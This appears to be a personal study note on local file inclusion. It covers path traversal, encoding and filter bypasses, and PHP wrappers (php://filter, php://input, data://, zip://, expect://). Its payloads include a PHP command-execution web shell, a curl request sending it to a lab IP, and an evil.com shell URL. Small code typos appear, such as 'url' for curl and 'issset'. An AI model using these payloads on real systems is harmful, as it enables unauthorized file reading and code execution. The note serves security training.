---
created: 2025-11-10 01:52:03
---

## File inclusion

Applications often dynamically determine what files to include in their responses based on user-controlled parameters. This is a common way to create personalized content.

However, when user input is directly concatenated into parameters of file inclusion functions without adequate validation, **file inclusion vulnerabilities** occur.

>**File inclusion** is a vulnerability that occurs when an application dynamically includes files based user-controlled input without proper validation. This allows an attacker to get unauthorized access to sensitive files by manipulating those parameters.

This vulnerability exists because web applications often need to include different files based on user actions — such as loading different page templates, language files, or module components. 

Depending on what resources the attacker is able to include, file inclusion vulnerabilities are divided into two types:

- **Local File Inclusion (LFI)** allows an attacker to include files stored locally on the target server.
- **Remote File Inclusion (RFI)** allows an attacker to include files stored on arbitrary remote servers.

This article mainly talks about **local file inclusion**.

>[!note] LFI is more common than RFI because it usually doesn't require any specific server configuration to be exploitable.

>[!note] For RFI, see [[RFI]].
## Background: the web root and file paths 

### The web root

>A **web root**, or **web document root**, is a top-level directory on a web server (e.g., Apache, Nginx, IIS) that contains files and subdirectories served by the application.

- Web root is typically located at:

| Server          | Web root                                   |
| --------------- | ------------------------------------------ |
| Apache (Linux)  | `/var/www/html`<br>`/var/www`              |
| Nginx (Linux)   | `/usr/share/nginx/html`<br>`/var/www/html` |
| IIS (Windows)   | `C:\inetpub\wwwroot`                       |
| XAMPP (Linux)   | `/opt/lampp/htdocs`                        |
| XAMPP (Windows) | `C:/xampp/htdocs`                          |
| WAMP (Windows)  | `C:\wamp\www`<br>`C:\wamp64\www`           |
| Apache (macOS)  | `/Library/WebServer/Documents`             |

- The web root usually contains only publicly accessible files — HTML, CSS, JavaScript, and media assets like images and videos. 
- Backend code and configuration files are usually stored outside the web root. On Linux systems, backend commonly resides in `/srv`, `/srv/app`, `/opt/application`, etc.

>[!important] Website visitors should never be able to access files outside of the web root. 

Which files or directories can be accessed or modified by the web server mainly depends on the privileges of the user on behalf of which the application is running (the web server process).

Commonly, web servers run under:

| System         | Default user                        | Group                |
| -------------- | ----------------------------------- | -------------------- |
| Apache (Linux) | `www-data`, `apache`, or `httpd`    | `www-data`, `apache` |
| Nginx (Linux)  | `nginx` or `www-data`               | `nginx`, `www-data`  |
| IIS (Windows)  | `IUSR` or `IIS APPPOOL\AppPoolName` | `IIS_IUSRS`          |

These are usually service users that have read access to web root content and minimal permissions elsewhere on the filesystem. But misconfigurations can significantly expand the set of accessible files.
### Directory separators

File path syntax varies across operating systems:

| OS                  | Root directory              | Directory separator                   | Case-sensitive? | Example                       |
| ------------------- | --------------------------- | ------------------------------------- | --------------- | ----------------------------- |
| Unix/Linux<br>macOS | `/`                         | `/`                                   | Yes             | `/var/www/html/file.txt`      |
| Windowos            | `C:\`<br>(`drive_letter:\`) | `\` (primary) or `/` (often accepted) | No              | `C:\inetpub\wwwroot\file.txt` |
| Classic Mac OS      | `drive:`                    | `:` (primary) or `/`                  | Varies          | `Macintosh HD:folder:file`    |

>[!important] Modern Windows APIs accepts both forward slashes (`/`) and backslashes (`\`) as directory separators.

- **Current directory:** `.` — references the current working directory.
- **Parent directory:** `..` — references the directory one level up in the hierarchy. 

>[!note] On Unix/Linux, `~` expands to the current user's home directory.

Depending on the web server and configuration, applications reference files via:
- **Absolute paths:** Start from the filesystem root directory and specify the complete path to the resource (e.g., `/etc/passwd`).
- **Relative paths:** Specify paths relative to the current working directory (e.g., `./includes/config.php`, `../../etc/passwd`).

>[!important] UNC (Universal Naming Convention) paths on Windows, like `\\<server>\<share_name>\file.txt`, can be used for accessing **network resources**.
>This may allow you to escalate **LFI to RFI** or force the server to initiate SMB connections to your server (which, among anything else, can be exploited in Pass-the-Hash attacks).
### Path normalization

Before accessing a file or directory, most file systems and APIs **normalize** paths:

- `.` (**current directory**) is removed:

```
/var/www/./html/./file.txt  →  /var/www/html/file.txt
```

- `..` is resolved to the **parent directory**:

```
/var/www/html/../config.php  →  /var/www/config.php
```

- **Redundant separators** are collapsed:

```
/var///www//html////file.txt  →  /var/www/html/file.txt
C:\\\\inetpub\\\\wwwroot  →  C:\inetpub\wwwroot
```

- Many systems remove or ignore **trailing slashes**:

```
/var/www/html/  →  /var/www/html
```

>[!note] See [[#Payloads and validation bypass]].

>[!important] Path normalization can occur at multiple layers — web servers (Apache, Nginx, IIS), reverse proxies, WAFs, application code, and filesystems. Discrepancies between those layers create opportunities for validation bypass.

>[!note] See a [list of operating systems with their file separators](http://en.wikipedia.org/wiki/Path_%28computing%29#Representations_of_paths_by_operating_system_and_shell).

## Local file inclusion

>**Local File Inclusion (LFI)** is a vulnerability that occurs when an attacker can force the application to include files stored locally on the web server.

>[!example]+
>Suppose the user can change the language of the page, say, by clicking a button. This sets the `language` URL query parameter:
>```
>https://example.com/index.php?language=es.php
>```
>This parameter carries the name of the file with the text in the corresponding language the application should use. 
>- On the back-end, it looks:
>```PHP
>if (issset($_GET['language'])) {
>	include($_GET['language']);
>}
>```
>- The code retrieves a filename from the `language` URL query parameter and directly uses it as an argument to the `include()` function that includes the file content in the response. 
>```PHP
>include('es.php');
>```
>
>- The problem is that the application **trusts user input implicitly** and **doesn't validate the parameter value**. 
>
>In this case, the attacker can inject any file path and, if the user on the server the application is running as has enough permissions to read it, this file will be displayed on the page. For example:
>```
>https://example.com/?page=/etc/passwd
>```
>This will cause the application to display the `/etc/passwd` file in response's HTML.
>This is a local file inclusion vulnerability.

>[!important]+ LFI vulnerabilities can lead to:
> 
> - **Sensitive information disclosure**
> 	- Reading sensitive system files, configuration files, source code, etc.
> - **Authentication bypass**
> 	- Stealing information from password files, sensitive management files, etc.
> - **Code execution**
> 	- Sometimes possible, such as with PHP wrappers.
> - **Privilege escalation**
> 	- Gathering information useful for further exploitation.
>
>Though the impact of LFI is not as severe as of RFI, the vulnerability poses a significant threat.

### LFI in source code

Many programming languages implement file inclusion functions that, given no proper validation, can be exploited for LFI (and sometimes RFI):

- **PHP**

```PHP
// all of these are vulnerable if the user controls the filename
include($file);              // includes and evaluates file; warning on failure
include_once($file);         // includes file only once
require($file);              // includes and evaluates file; fatal error on failure  
require_once($file);         // requires file only once
file_get_contents($file);    // reads entire file into string (no execution)
fopen($file, 'r');           // opens file for reading
readfile($file);             // outputs file contents
file($file);                 // reads entire file into array
highlight_file($file);       // syntax highlighting of PHP file
show_source($file);          // alias for highlight_file
```

>[!note]+
>You can read more about these files in the documentation:
>- [`include()`](https://www.php.net/manual/en/function.include.php)
> - [`include_once()`](https://www.php.net/manual/en/function.include-once.php)
> - [`require()`](https://www.php.net/manual/en/function.require.php)
> - [`require_once()`](https://www.php.net/manual/en/function.require-once.php)
> - [`file_get_contents()`](https://www.php.net/manual/en/function.file-get-contents.php)

- **Python**

```Python
# Flask/Django vulnerable patterns
open(filename, 'r')                    # opens file for reading
with open(filename) as f:              # context manager for file reading
exec(open(filename).read())            # executes file content as code
eval(compile(open(filename).read()))   # compiles and evaluates file
__import__(filename)                   # dynamic module import
```

>[!example]+ Example: Vulnerable file reader in Python
> 
> ```Python
> from flask import Flask, request, render_template
>  
> app = Flast(__name__)
> 
> @app.route('/', methods=['GET'])
> def index():
> 	filename = request.args.get('file') # reads filename from the query parameter, no validation
> 	with open(filename, 'r') as f:
> 		content = f.read() # opens the file for reading and stores its content in a variable
> 	return render_template('index.html', file=content) # renders a template with file content
> ```
> 
> Exploitation:
> 
> ```
> https://example.com/?file=../../../../../../../../../etc/passwd
> ```
> 
> ![[directory_traversal.png]]


>[!example]+ Example: Vulnerable template loading in Python (Flask)
> 
> ```Python
> from flask import Flask, request, render_template
>  
> app = Flast(__name__)
> 
> @app.route('/', methods=['GET'])
> def index():
> 	template = requests.args.get('template', 'default') # reads filename, no validation
> 	return render_template(f'{template}.html') # loads a template based on user-controlled parameter
> ```
> 
> Exploitation:
> 
> ```
> https://example.com/?template=../../../../etc/passwd
> ```

- **Java**

```Java
// vulnerable patterns
FileInputStream(filename)                 // reads file as stream
BufferedReader(new FileReader(filename))  // buffered file reading
Files.readAllBytes(Paths.get(filename))   // reads entire file
new File(filename)                        // file object creation
include(filename) // JSP                  // JSP include directive
```

>[!example]+ Example: Flawed document viewer in Java
> 
> ```Java
> public void viewDocument(String filename) {
>     File file = new File("/documents/" + filename); // normally access files in the ./documents directory
>     FileInputStream fis = new FileInputStream(file);
>     // ... read and display file
> }
> ```
> 
> Exploitation:
> 
> ```
> https://example.com/view?filename=../../../../etc/passwd
> ```

- **Node.js**

```JS
// vulnerable patterns
require(filename)                      // module loading (executes code)
fs.readFile(filename)                  // asynchronous file reading
fs.readFileSync(filename)              // synchronous file reading
fs.createReadStream(filename)          // stream-based reading
```

>[!example]+ Example: Node.js vulnerable file download
> 
> ```JS
> app.get('/download', (req, res) => {
>     // vulnerable file download
>     const filename = req.query.file;
>     res.sendFile(__dirname + '/files/' + filename);
> });
> ```
> 
> Exploitation:
> 
> ```
> https://target.com/download?file=../../../../etc/passwd
> ```
### Common injection points

The injection may occur in almost any part of the application. Common parameters include:

- `GET` strings (query strings)
- `POST` parameters
- Hidden form fields
- Cookies
- HTTP headers (e.g., `X-Forwarded-For`, `Referer`, `User-Agent`, etc.)
- Session variables
- Upload filenames
- Redirect URLs
- API endpoints
- CMS themes/templates
- Path segments (URL path parameters in RESTful APIs)
- etc.

>[!tip]+
>Use tools like Burp Suite's **Param Miner** or **Arjun** to enumerate potentially vulnerable parameters. 
>```bash
>arjun -u https://example.com/index.php
>```
>You can also use **`ffuf`** to fuzz parameter names.
>```bash
> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
>      -u 'https://example.com/index.php?FUZZ=key' \
>      -fs 4242  # filter responses based on size 
>```


Any part of the application may be vulnerable. Commonly exploited functionality includes:
- File download
- Document viewing
- Template loading
- Settings and preferences (e.g., language selection)
- File generation or processing
- File export
- Images/media handling

>[!note] Whether to use absolute paths or relative with traversal sequences depends on the target application. In black box, you would usually try all possibilities.


>[!note]+ When LFI is harder to spot
> - When the application appends a fixed extension (e.g., `.php`, `.jpg`, etc.).
> - When the application enforces a base folder (e.g., must start with `./uploads`).
> - When there's filtering in place.
> - When the parameter is stored in a database first (second-order LFI).
## Bypass techniques
### Handling appended extensions

Often, developers would append a fixed file extension before trying to access the file:

```PHP
<?php
include($_GET['language'] . '.php')
?>
```

This attempts to force all includes to be PHP files (e.g., if the `language` parameter is set to `es`, the accessed file will be `es.php`; if you try injecting `/etc/passwd`, the application will try `/etc/passwd.php`, which doesn't exist). 

There are several bypass techniques you may try:

- **Null byte injection** (PHP < 5.5)
	- PHP versions before 5.5 were vulnerable to the **null byte injection**: you could add a URL-encoded null byte (`%00`) at the end of your injected value, and this would cause PHP to prematurely terminate processing the string.
	- So, if you inject `/etc/passwd%00`, this will result in `/etc/passwd%00.php`, but the application will only process the `/etc/passwd` part because of the null byte.
	- `\x00` or `\0` could also work.

```PHP
/etc/passwd%00
```

>[!interesting] **A null byte, `%00` or `0x00`**, also known as a  **null character**, is a special control character used as a string terminator in many programming languages, including C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.

>[!warning] Null byte injection no longer works on modern systems — this was patched in PHP 5.5+.

- **Path truncation** (PHP < 5.5)
	- PHP had a maximum path length of 4096 characters on 32-bit systems. Paths longer than this are truncated.
	- In this case, you can use a very long path with references to the current and parent directories so that it eventually resolves to the directory you need. The file extension is then truncated because of the length restrictions. 

```PHP
?file=../../../../etc/passwd/././././././<repeat...>./././
```

>[!warning] Patched in PHP 5.5+ — path truncation won't work on modern versions.

- **PHP wrappers**
	- PHP wrappers is the most reliable bypass, since they work on modern PHP (if the application doesn't filter it):

```PowerShell
?file=zip://uploads/shell.php%23.jpg -> shell.php#jpg
```

>[!note] Even if you can't get rid of the extension, you may still exploit this to read files with that given extension. If it's an extension of a programming language, like `.php`, you could use it to read source code. 


- You can try fuzzing characters that might be interpreted as delimiters on the back-end (just like you would do in web cache deception testing):

```bash
echo "'" && echo '! " # $ % &  ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~ %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E' | tr ' ' '\n'
```

### Path prefix validation

An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. 

>[!example]+
> 
> ```PHP
> if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
> 	include($_GET['language']); 
> } else { 
> 	echo 'Illegal path specified.'; 
> }
> ```

It might be possible to bypass such filers by including the required base folder first, and then navigating away from that directory with traversal sequences:

```PowerShell
/var/www/images/../../../etc/passwd
```
### Nested traversal sequences

Many filters remove or block traversal sequences like `../` or `..\`. However, if the filter is not recursive, you can bypass it by nesting traversal sequences in the way that after filtering, redundant characters are removed, and a valid traversal remains:

- `....//....//....//` -> After removing one `../`, still leaves `../`.
- `..../\..../\..../\` -> Mixes slashes `/` and backslashes `\` for cross-platform bypass.

```
....//....//....//etc/passwd
```

```
....//....//....//
..././..././..././
..../\..../\..../\
.../.\.../.\.../.\
....\/....\/....\/
...\./...\./...\./
```

![[nested_directory_traversal_bypass.png]]
### Encoding

Characters used in directory traversal sequences might be blocked. You might be able to bypass it with encoding:

- **URL encoding:** `/` → `%2f`, `\` → `%5c`, `.` → `%2e`
- **Double URL encoding:** `/` → `%252f`, so `%252e%252e%252f` decodes to `../`
- **Unicode encoding:** `/` → `%u002f`, `\` → `%u005c`
- **UTF-8 overlong encoding:** `/` → `%c0%af`, `.` → `%c0%2e`
- **Mixing encodings:** you can combine different encodings in the same payload to bypass filters.

>**URL encoding** — [CyberShef example](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=Li4vLi4v)

```PowerShell
%2E%2E%2F%2E%2E%2F%2E%2E%2F # ../../../
```

| Character | URL encoding |
| --------- | ------------ |
| `/`       | `%2f`        |
| `\`       | `%5c`        |
| `.`       | `%2e`        |

>**Double URL-encoding** — [CyberShef example](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)URL_Encode(true)&input=Li4vLi4vLi4v)

```PowerShell
%252E%252E%252F%252E%252E%252F%252E%252E%252F # ../../../
```

| Character | Double URL encoding |
| --------- | ------------------- |
| `/`       | `%252f`             |
| `\`       | `%255c`             |
| `.`       | `%252e`             |

>**Unicode encoding** — [CyberShef example](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',true,4,false)&input=Li4vLi4vLi4v)

- Can be used with different prefixes: `\u`, `%u`, `+U`.

```PowerShell
%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f # %u - ../../../
\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f # \u - ../../../
U+002eU+002eU+002fU+002eU+002eU+002fU+002eU+002eU+002f # +U - ../../../
```

| Character | Unicode `%u` | Unicode `\u` | Unicode `+U` |
| --------- | ------------ | ------------ | ------------ |
| `/`       | `%u002f`     | `\u002f`     | `U+002f`     |
| `\`       | `%u005c`     | `\u005c`     | `U+005c`     |
| `.`       | `%u002e`     | `\u002e`     | `U+002e`     |

>**UTF-8 overlong encoding**

```
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

| Character | Encoding    |
| --------- | ----------- |
| `/`       | `%c0%af`    |
|           | `%e0%80%af` |
|           | `%c0%2f`    |
| `\`       | `%c0%5c`    |
|           | `%c0%80%5c` |
| `.`       | `%c0%2e`    |
|           | `%e0%40%ae` |
|           | `%c0ae`     |

```bash
# URl encoding

%2e%2e%2f # ../
%2e%2e/   # ../
..%2f     # ../
%2e%2e%2c # ..\
%2e%2e/   # ..\
..%2c     # ..\

# double URl encoding

%252e%252e%252f # ../
%252e%252e%2f   # ../
%2e%2e%252f     # ../
%252e%252e%252c # ..\
%252e%252e%2c   # ..\
%2e%2e%252c     # ..\

# 16-bit unicode 
%u002e%u002e%u002f # ../ 
%u002e%u002e/      # ../
..%u002f           # ../
%u002e%u002e%u005c # ..\
%u002e%u002e\      # ..\
..%u005c           # ..\

# UTF-8 encoding
%c0%2e%c0%2e%c0%af # ../
%c0%2e%c0%2e%c0%5c # ..\

```

### Length restrictions

The application might limit the length of the payload you can submit. 
In this cases, try injecting a long traversal sequence first and then gradually reducing its size until the application accepts the payload:

```bash
../../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../etc/passwd
../../../../etc/passwd
../../../etc/passwd
```
### On `Content-Disposition`

The browser usually displays the information retrieved from files from the server with the directory traversal attack in the page, but it might not always be the case. This behavior is governed by the `Content-Disposition` header:

- **`Content-Disposition: inline`**  
	- Tells the browser to display the content directly in the browser window, if possible. For example, when a text file or image is retrieved, the browser will render it immediately. 
	- This is convenient since the results of a directory traversal payload (such as the contents of `/etc/passwd`) will be visible directly in the browser.

- **`Content-Disposition: attachment`**  
	- This instructs the browser to treat the response as a downloadable file. Instead of displaying the file's contents, the browser prompts the user to save or open the file. 
	- This is quite inconvenient during testing, since each payload requires a manual download and then opening the file to inspect its contents. This can slow down automated or semi-automated testing, especially when testing multiple payloads or endpoints in quick succession.

Tools like `curl` and `wget` ignore the `Content-Disposition` header and output the response body directly to the terminal (unless instructed otherwise).
This will let you quickly see file contents.

### Second-order LFI

**Second-order LFI** occurs when user input is first safely stored (in a database, file, session) and later used in a file operation without proper validation.

>[!example]+ Example: Second-order LFI
> The user first uploads an avatar with the name like:
> 
> ```
> ../../../../etc/passwd
> ```
> 
> This filename is stored in a database. 
> 
> Later on, when the user navigates to the user profile, the application returns their profile data and includes previously stored file. But since it points to `/etc/passwd`, the attacker gets the content of the user database instead of a picture.
> 
> ```PHP
> $user = getUser($user_id); 
> $avatar_path = "/var/www/uploads/" . $user['avatar']; 
> include($avatar_path); // vulnerable
> ```

Such vulnerabilities are much harder to detect; they require you to watch carefully where your input goes inside the application. Such testing is much easier to conduct during white-box engagements, with the source code in hands.
## PHP wrappers and LFI to RCE

>**PHP wrappers**, also called **stream wrappers** or **protocol wrappers**, are a powerful abstraction layer built into PHP that allows the language to handle different types of data streams through a unified interface.

- PHP wrappers extend PHP's file handling capabilities beyond simple local filesystem operations. They allow access to various data sources, such as **remote files**, **compressed archives**, **raw input data**, **memory streams**, and more — all through the same file operation functions like `include()`, `file_get_contents()`, `fopen()`, `readfile()`, and the like.

Wrappers are specified by a prefix before the resource locator:

```
wrapper://[parameters]/resource
```

>[!note]+ How PHP processes wrappers
> 1. PHP parses the protocol scheme (before `://`).   
> 2. Identifies the registered wrapper handler.
> 3. Delegates the operation to that wrapper.
> 4. The wrapper performs its specific operations.
> 5. Returns data in standardized format to PHP core.
> 6. PHP processes the returned data (executing code if appropriate).

For example, `http://example.com/file.txt` uses the HTTP wrapper to fetch remote content, and `file://etc/passwd` uses the file wrapper for local filesystem access. 

>[!important] PHP filters can often be used to **escalate LFI to RCE (Remote Code Execution)**.

PHP wrappers are a very powerful LFI exploitation method. Here are some examples:
- `php://filter`
- `php://input`
### `php://filter`

>The **`php://filter` wrapper** creates a chains of filters that process the target resource before returning it to the application; each filter in the chain transforms the data stream sequentially

- `php://filter` allows you to read files, including source code, but without execution. 
- This wrapper works on **default PHP configuration with no special settings required**; e.g., it doesn't require `allow_url_include=On`.

Format:

```
php://filter/[filter_name]/resource=[target_file]
```

- `[filter_name]`: One or more filters (can be chained with `|`).
- `[target_file]`: The target file to read.

>[!note]+ The filters the wrapper supports include: 
> - [String filters](https://www.php.net/manual/en/filters.string.php) (e.g., `string.rot13`, `string.toupper`, `string.tolower`).
> - [Conversion filters](https://www.php.net/manual/en/filters.convert.php) (e.g., `convert.base64-encode`, `convert.base64-decode`, `convert.iconv.*`).
> - [Compression filters](https://www.php.net/manual/en/filters.compression.php) (e.g., `zlib.deflate`, `zlib.inflate`, `bzip2.compress`, `bzip2.decompress`).
> - [Encryption filters](https://www.php.net/manual/en/filters.encryption.php) (e.g., `mcrypt.*`, `mdecrypt.*`).

- `convert.base64-encode`, Base64 filter, is probably the most useful one for LFI:

```
php://filter/convert.base64-encode/resource=config.php
```

>[!note]+ Decode Base64
>```bash
>echo "<Base64>" | base64 -d
>```

- `convert.rot13`, [ROT13](https://en.wikipedia.org/wiki/ROT13) encoding:

```
php://filter/read=string.rot13/resource=config.php
```

>[!note]+ Decode ROT13
>```bash
>echo "<ROT13>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
>```

- Convert to uppercase:

```
php://filter/string.toupper/resource=config.php
```

- Convert to lowercase:

```
php://filter/string.tolower/resource=config.php
```

- UTF-8 to UTF-7:

```
php://filter/convert.iconv.utf-8.utf-7/resource=config.php
```

- UTF-8 to UTF-16:

```
php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

- Chaining filters:

```
php://filter/read=string.rot13|convert.base64-encode/resource=config.php
```

### `php://input`

>The **`php://input` wrapper** provides a read-only access to the raw HTTP `POST` request body. 

- When used in file inclusion functions, it reads the `POST` data and treats it as file content — including **executing any PHP code within it**.

>[!warning] `php://input` requires **`allow_url_include=On`** in `php.ini` (common in legacy systems) and a HTTP `POST` request (`GET` won't work).


>[!note]+ How `php://input` works
> 1. Attacker sends POST request with PHP code in body.
> 2. Application includes `php://input`.
> 3. PHP reads raw `POST` data stream.
> 4. Include function receives `POST` body as "file content".
> 5. PHP executes the code in `POST` body.
> 6. Attacker gains code execution.

>[!example]+
> URL:
> 
> ```
> http://example.com/index.php?page=php://input&cmd=id
> ```
> 
> `POST` body:
> 
> ```PHP
> <?php system($_GET["cmd"]); ?>
> ```
> This together executes the `whoami` command on the server and displays the output.
> ```bash
> url -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.122.72:59642/index.php?language=php://input&cmd=id" | grep uid
> ```
### `data://`

>The **`data://`** wrapper implements [`RFC 2397`](https://datatracker.ietf.org/doc/html/rfc2397) data URIs, which can be used to embed data directly in the URL. 

- `data://` is similar to `input://` but **works with `GET` requests**. 

Format:

```
data://[media_type][;encoding],[data]
```

>[!warning] To work. the `data://` wrapper requires `allow_url_include=On` and `allow_url_fopen=On` in `php.ini`.

>[!example]+ Example: `phpinfo()`
> ```
> https://example.com/index.php?page=data://text/plain,<?php phpinfo(); ?>
> ```
> - URL-encoded:
> ```
> https://example.com/index.php?page=data://text/plain,%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E
> ```

>[!example]+ Example: Command execution via a `GET` parameter
> 
> ```
> https://example.com/?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
> ```
> - URL-encoded:
>```
>`https://example.com/?page=data://text/plain,%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E&cmd=whoami`
>```

- Through you can transmit data as it as, just with URL encoding, it's more reliable to use Base64, since it avoids URL encoding issues with special characters.

>[!example]+ Example: Base64 `data://` URL
> ```bash
> echo -n '<?php system($_GET["cmd"]); ?>' | base64
> ```
> 
> ```
> data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
> ```
> ```
>https://example.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
> ```

- PHP's data:// wrapper also supports ROT13.

>[!example]+ Example: ROT13 `data://` URL
> ```bash
> echo '<?php system($_GET["cmd"]); ?>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
> ```
> 
> ```
> https://example.com/?page=data://text/plain;charset=rot13,<?cuc flfgrz($_TRG["pzq"]); ?>&cmd=id
> ```
### `zip://`

>The **`zip://` wrapper** gives access to files within ZIP archives without extracting the archive itself. 

- The wrapper processes any file with a valid ZIP structure; extraction happens in memory. 
- `zip://` doesn't require `allow_url_include=On` and works on **default PHP configuration**.

Format:

```
zip://[path/to/archive.zip]#[internal_filename]
```

>[!note] The `#` symbol must be URL-encoded as `%23` in HTTP requests (or it will be interpreter as a client-side anchor).


>[!tip]+
> You can use this wrapper to upload a compressed shell file, with any extension, and then access it through the `zip://` file.

### `expect://`

>The **`expect://` wrapper** allows **direct execution of system commands**.

>[!warning] This wrapper is rarely available since it requires the `expect` PECL extension installed.

Format:

```
expect://command
```

>[!example]+
> ```
> expect://whoami
> ```

### PHP wrapper cheat sheet

| Wrapper                      | Description                               | Example                                                  | Requires `allow_url_include`? | Default Enabled?                     |
| ---------------------------- | ----------------------------------------- | -------------------------------------------------------- | ----------------------------- | ------------------------------------ |
| `php://filter`               | Applies transformation filters to streams | `php://filter/convert.base64-encode/resource=config.php` | ❌ No                          | ✅ Yes                                |
| `php://input`                | Reads raw POST data                       | `php://input` (with POST body)                           | ✅ Yes                         | ✅ Yes                                |
| `data://`                    | Embeds inline data using RFC 2397         | `data://text/plain,<?php phpinfo(); ?>`                  | ✅ Yes                         | ✅ Yes                                |
| `zip://`                     | Accesses files inside ZIP archives        | `zip://uploads/file.jpg%23shell.php`                     | ❌ No                          | ✅ Yes                                |
| `phar://`                    | PHP Archive with auto-deserialization     | `phar://uploads/evil.phar/stub`                          | ❌ No                          | ✅ Yes                                |
| `expect://`                  | Direct system command execution           | `expect://whoami`                                        | ❌ No                          | ❌ No (requires extension)            |
| `file://`                    | Standard filesystem access (default)      | `file:///etc/passwd`                                     | ❌ No                          | ✅ Yes                                |
| `http://`, `https://`        | Remote file access via HTTP               | `https://evil.com/shell.php`                             | ✅ Yes                         | ✅ Yes (also needs `allow_url_fopen`) |
| `ftp://`                     | Remote file access via FTP                | `ftp://user:pass@evil.com/shell.php`                     | ✅ Yes                         | ✅ Yes                                |
| `glob://`                    | Pattern matching for file discovery       | `glob:///var/www/html/*.php`                             | ❌ No                          | ✅ Yes                                |
| `php://output`               | Writes to output buffer                   | `php://output`                                           | ❌ No                          | ✅ Yes                                |
| `php://memory`, `php://temp` | Memory/temporary storage access           | `php://temp`                                             | ❌ No                          | ✅ Yes                                |

## Testing methodology

Checklist:

- [ ] Can you read a known file outside the web root?

```
?file=../../../../etc/passwd
```

- [ ] Can you read application source code or configuration files?

```
?file=../../../../var/www/html/config.php
```

- [ ] Do PHP wrappers work? (PHP applications only)

```
?file=php://filter/convert.base64-encode/resource=index.php
```

- [ ] Can you archive RCE?

```
?file=php://input (with POST payload)
?file=data://text/plain,<?php phpinfo(); ?>
```


One of the most effective ways to test for LFI and validation bypasses is through **fuzzing**. You take a parameter you suspect may be vulnerable to LFI, and then test values from a wordlist, one-by-one, with an automated tool like `ffuf`. 

Here're some useful fuzzing wordlists for LFI:

- [`seclists/Fuzzing/LFI/LFI-Jhaddix.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [`seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt)
- [`seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt)
- [`seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Windows-adeadfed.txt)
- [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
- [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
- [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt)
- [`seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-linux-and-windows_by-1N3%40CrowdShield.txt")
- [`seclists/Fuzzing/LFI/OMI-Agent-Linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/OMI-Agent-Linux.txt)

>[!example]+
> ```bash
> ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
>      -u 'https://example.com/index.php?page=FUZZ' \
>      -mr "root:" \ # match regex
>      -fs 4242
> ```

You can also try automated tools like:
- [`LFISuite`](https://github.com/D35m0nd142/LFISuite)
- [`dotdotpwn`](https://github.com/wireghoul/dotdotpwn)

## References and further reading


- [`Path Traversal — OWASP`](https://owasp.org/www-community/attacks/Path_Traversal)
- [`Directory Traversal — swisskyrepo/PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)
- [`File Inclusion/Path traversal — HackTricks`](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

- [`Path (computing) — Wikipedia`](https://en.wikipedia.org/wiki/Path_%28computing%29#Representations_of_paths_by_operating_system_and_shell)
- [`Directory Traversal Attack u2014 Wikipedia`](https://en.wikipedia.org/wiki/Directory_traversal_attack)

- [`FileInc — TryHackMe`](https://tryhackme.com/room/fileinc)

- [`CWE-23: Relative Path Traversal`](https://cwe.mitre.org/data/definitions/23.html)
- [`CWE-35: Path Traversal`](https://cwe.mitre.org/data/definitions/35.html)
- [`CWE-22: Improper Limitation of a Pathname to a Restricted Directory`](https://cwe.mitre.org/data/definitions/22.html)

- [`LFI Cheat Sheet — HighOn.Coffee`](https://highon.coffee/blog/lfi-cheat-sheet/)
- [`File Inclusion — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
